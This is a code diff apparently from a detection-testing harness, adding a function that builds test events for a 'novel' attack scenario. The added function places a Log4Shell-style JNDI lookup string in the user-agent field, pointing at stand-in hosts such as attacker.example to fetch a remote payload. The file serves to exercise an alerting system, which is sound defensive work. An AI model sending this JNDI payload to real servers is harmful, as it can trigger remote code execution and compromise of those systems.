@@ -32,3 +32,19 @@ def run_canary_scenario(target: str, attacker_ip: str = "203.0.113.7") -> None:
     )
     print(f"      Response: HTTP {r2.status_code} (expected 401)")
     print("Done. Check the dashboard in ~2 seconds for the Critical alert.")
+    
+def novel_attack_payload(variant: int = 0) -> dict:
+    host = "attacker.example" if variant == 0 else f"evil{variant}.test"
+    return {
+        "method": "GET",
+        "path": "/",
+        "query": "",
+        "body": "",
+        "user_agent": f"${{jndi:ldap://{host}/payload}}",
+    }
+
+
+# In your scenario runner:
+# if scenario == "novel":
+#     payload = novel_attack_payload(variant=index)
+#     send_event(payload)
